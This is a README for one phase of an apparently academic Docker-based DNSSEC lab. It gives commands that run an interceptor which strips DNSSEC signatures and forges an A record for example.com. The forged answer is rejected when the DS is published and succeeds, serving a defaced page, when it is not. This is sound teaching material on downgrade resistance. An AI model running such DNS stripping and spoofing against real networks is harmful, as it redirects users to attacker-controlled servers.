# Phase 4 — Signature Stripping & Downgrade

Reuses the Phase 3 signed hierarchy and validating resolver. The interceptor gains a **`strip`
mode** that, for `example.com`, removes the DNSSEC records and substitutes a forged `A` pointing
at `rogue-web`. Two runs show where downgrade resistance really comes from.

## What's new

- `attack/interceptor.c` adds **`strip`** mode. For `example.com` responses it re-emits the
  message dropping the zone's own-data security — the `A` RRSIG, the `DNSKEY`, and the `DS` in the
  com referral — and rewrites the `A` to `172.16.1.30`. It deliberately **keeps** any `NSEC`/`NSEC3`
  and the RRSIGs that cover them: that is the parent's *authenticated* proof of (in)security, which
  an attacker cannot forge and must not destroy.
- `sign/sign-all.sh` takes a mode: `full` (Phase-3 chain, example.com DS published in com) or
  **`nods`** (com publishes **no** DS for example.com — the operator signed the child but never
  gave its DS to the parent).

## Run A — strip against the fully signed chain (downgrade resisted)

```bash
docker build -t cs6008-dnslab:base ../common
docker run --rm -v "$PWD":/phase4 -w /phase4 cs6008-dnslab:base sign/sign-all.sh full
docker compose up -d
docker exec attacker make -C /attack
docker exec core-router sh /diversion/divert-on.sh
docker exec -d attacker sh -c "exec /attack/interceptor eth0 172.16.2.10 172.16.1.30 strip > /tmp/s.log 2>&1"
docker exec resolver rndc -c /etc/bind/rndc.conf flush
docker exec client dig example.com          # -> SERVFAIL
docker logs resolver 2>&1 | grep "broken trust chain"
```
Result: **SERVFAIL** ("broken trust chain"). Stripping the signatures and even the DS does not
help — see Report.

## Run B — the operator forgets the DS (downgrade succeeds)

```bash
docker exec attacker pkill -f interceptor
docker run --rm -v "$PWD":/phase4 -w /phase4 cs6008-dnslab:base sign/sign-all.sh nods
docker compose restart root-ns tld-ns domain-ns resolver
docker exec core-router sh /diversion/divert-on.sh
docker exec -d attacker sh -c "exec /attack/interceptor eth0 172.16.2.10 172.16.1.30 strip > /tmp/s.log 2>&1"
docker exec resolver rndc -c /etc/bind/rndc.conf flush
docker exec client dig +short example.com    # -> 172.16.1.30
docker exec client curl -s http://example.com # -> DEFACED
```
Result: the client receives **172.16.1.30** (no `ad` flag) and fetches the rogue page.

## Files

- `attack/interceptor.c` — now `relay | forge | strip`.
- `sign/sign-all.sh [full|nods]` — signs the chain, with/without the example.com DS in com.
- `config/`, `diversion/`, `www/`, `rogue-www/` — as Phase 3.
- `evidence/` — Run A (SERVFAIL + log + capture), Run B (172.16.1.30 + capture), interceptor logs.
